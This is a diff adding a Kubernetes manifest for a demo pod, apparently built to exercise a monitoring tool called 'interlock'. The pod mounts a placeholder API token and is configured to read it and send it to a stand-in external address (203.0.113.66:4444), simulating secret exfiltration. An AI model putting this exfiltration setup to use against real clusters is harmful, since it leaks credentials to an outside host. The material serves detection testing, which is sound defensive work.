@@ -1,0 +1,43 @@
+# Demo agent pod: sensitive-file read → dial+write secret (EXFIL path).
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: interlock-demo-secret
+  namespace: default
+data:
+  demo-token: |
+    sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: interlock-exfil-demo
+  namespace: default
+  labels:
+    interlock.io/monitor: "true"
+    app: interlock-exfil-demo
+spec:
+  restartPolicy: Never
+  containers:
+    - name: exfil
+      image: interlock:dev
+      imagePullPolicy: IfNotPresent
+      command: ["/k8s-exfil-demo"]
+      env:
+        - name: DELAY_SEC
+          value: "12"
+        - name: EXFIL_TARGET
+          value: "203.0.113.66:4444"
+        - name: DEMO_SECRET_PATH
+          value: "/secrets/demo-token"
+      volumeMounts:
+        - name: secrets
+          mountPath: /secrets
+          readOnly: true
+  volumes:
+    - name: secrets
+      configMap:
+        name: interlock-demo-secret
+        items:
+          - key: demo-token
+            path: demo-token
